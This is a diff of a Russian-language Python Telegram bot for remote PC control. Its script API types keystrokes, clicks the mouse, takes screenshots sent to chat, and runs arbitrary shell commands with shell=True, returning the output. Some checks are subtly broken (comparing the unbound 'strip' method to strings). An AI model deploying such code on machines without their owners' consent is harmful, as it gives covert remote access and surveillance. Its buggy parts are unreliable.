         sbc.set_brightness(int(level))
         bot.send_message(message.chat.id, f'❌ *Вы успешно установили уровень яркости {level}!*', parse_mode='Markdown')
@@ -1673,37 +1455,29 @@ def check_brightness_set(message):
 
 #Бинд API
 class bindAPI:
-    def setWait(dur):
-        try:
-            return time.sleep(int(dur))
-
+    def setWait(duration):
+        try: return time.sleep(int(duration))
         except:
             error = 1
-            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setWait, время = {dur}*", parse_mode='Markdown')
+            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setWait, длительность задержки = {duration}*", parse_mode='Markdown')
 
     def setCursor(x, y):
-        try:
-            return pyautogui.moveTo(int(x), int(y))
-
+        try: return pyautogui.moveTo(int(x), int(y))
         except:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция setCursor, x = {x}, y = {y}*", parse_mode='Markdown')
 
     def writeKeyboard(text):
-        try:
-            return keyboard.write(text, 0)
-
+        try: return keyboard.write(text, 0)
         except:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция writeKeyboard, текст = {text}*", parse_mode='Markdown')
 
-    def useKeyboard(combo):
-        try:
-            return keyboard.send(combo)
-
+    def useKeyboard(combination):
+        try: return keyboard.send(combination)
         except:
             error = 1
-            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useKeyboard, комбинация = {combo}*", parse_mode='Markdown')
+            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useKeyboard, комбинация = {combination}*", parse_mode='Markdown')
 
     def useConsole(cmd, sendResult, sendId):
         try:
@@ -1711,17 +1485,14 @@ class bindAPI:
                 output=subprocess.getoutput(cmd, encoding='cp866')
                 return bot.send_message(sendId, output)
                 
-            else:
-                return subprocess.Popen(cmd, shell=True)
+            else: return subprocess.Popen(cmd, shell=True)
 
         except:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция useConsole, команда = {cmd}, sendResult = {sendResult}, sendId = {sendId}*", parse_mode='Markdown')
 
     def openSite(site):
-        try:
-            return webbrowser.open(site)
-
+        try: return webbrowser.open(site)
         except:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openSite, сайт = {site}*", parse_mode='Markdown')
@@ -1730,39 +1501,27 @@ class bindAPI:
         try:
             pyautogui.screenshot("screen.png")
             return bot.send_document(int(sendId), open("screen.png", 'rb'))
-
         except:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция sendScreenshot, sendId = {sendId}*", parse_mode='Markdown')
 
     def sendMessage(sendId, text):
-        try:
-            return bot.send_message(int(sendId), text)
-
+        try: return bot.send_message(int(sendId), text)
         except:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция sendMessage, sendId = {sendId}, текст - {text}*", parse_mode='Markdown')
 
     def openProgram(path):
-        try:
-            return subprocess.Popen(f"start {path}")
-
+        try: return subprocess.Popen(f"start {path}")
         except FileNotFoundError:
             error = 1
             return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openProgram, path = {path}*, файл не был найден", parse_mode='Markdown')
-
-        except:
-            error = 1
-            return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда! *Функция openProgram, path = {path}*", parse_mode='Markdown')
+    
 
     def clickMouse(button):
         try:
-            if button == 'r':
-                return pyautogui.click(button='right')
-
-            elif button == 'l':
-                return pyautogui.click()
-
+            if button == 'r': return pyautogui.click(button='right')
+            elif button == 'l': return pyautogui.click()
             else:
                 error = 1
                 return bot.send_message(chat_id, f"⚠️ Произошла ошибка при выполнении бинда: неизвестная кнопка! Доступные варианты - r или l\n*Функция clickMouse, button = {button}*", parse_mode='Markdown')
@@ -1790,15 +1549,9 @@ def check_bind_menu(message):
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
         cmd = message.text.strip()
-
-        if cmd == '/start' or cmd == 'Назад':
-            return mainmenu(message)
-
-        elif cmd == 'Удалить бинд':
-            return bind_delete(message)
-
-        elif cmd == 'Использовать бинд':
-            return choose_bind(message)
+        if cmd == '/start' or cmd == 'Назад': return mainmenu(message)
+        elif cmd == 'Удалить бинд': return bind_delete(message)
+        elif cmd == 'Использовать бинд': return choose_bind(message)
 
         else:
             bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
@@ -1821,11 +1574,8 @@ def check_bind_del(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip == "/start":
-            return start(message)
-
-        elif message.text.strip == "Назад":
-            return bind_menu(message)
+        if message.text.strip == "/start": return start(message)
+        elif message.text.strip == "Назад": return bind_menu(message)
 
         #////////////////////
 
@@ -1855,11 +1605,8 @@ def bind_read(message):
     get_chat_id = message.chat.id
 
     if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
-        if message.text.strip == "/start":
-            return start(message)
-
-        elif message.text.strip == "Назад":
-            return bind_menu(message)
+        if message.text.strip == "/start": return start(message)
+        elif message.text.strip == "Назад": return bind_menu(message)
 
         if os.path.isfile(f"binds\\{message.text.strip()}.txt"):
             bind_menu(message)
@@ -1874,12 +1621,10 @@ def bind_read(message):
         code = text.split("\n")
 
         for i in code:
-            if error == 1:
-                return
+            if error == 1: return False
 
             try:
-                if i.startswith('//'):
-                    continue
+                if i.startswith('//'): continue
 
                 elif i.startswith('wait'):
                     info = i.split('=', maxsplit=1)
@@ -1924,19 +1669,14 @@ def bind_read(message):
                     info = i.split('=', maxsplit=1)
                     bindAPI.clickMouse(str(info[1]))
 
-                elif (i == '' or None):
-                    continue
+                elif (i == '' or None): continue
                 
-                else:
-                    bot.send_message(chat_id, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nДанной функции не существует!*", parse_mode='Markdown')
-                    return
+                else: return bot.send_message(chat_id, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nДанной функции не существует!*", parse_mode='Markdown')
 
-            except IndexError:
-                bot.send_message(chat_id, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nПроверьте аргументы строки!*", parse_mode='Markdown')
-                return
+            except IndexError: return bot.send_message(chat_id, f"*⚠️ Произошла ошибка во время выполнения:\n{i}\nПроверьте аргументы строки!*", parse_mode='Markdown')
         
         error = 0
         return bot.send_message(message.chat.id, '☑️ *Бинд был успешно использован!*', parse_mode='Markdown')
 
-if __name__ == '__main__':
+if __name__ == '__main__': 
     bot.infinity_polling(none_stop = True)
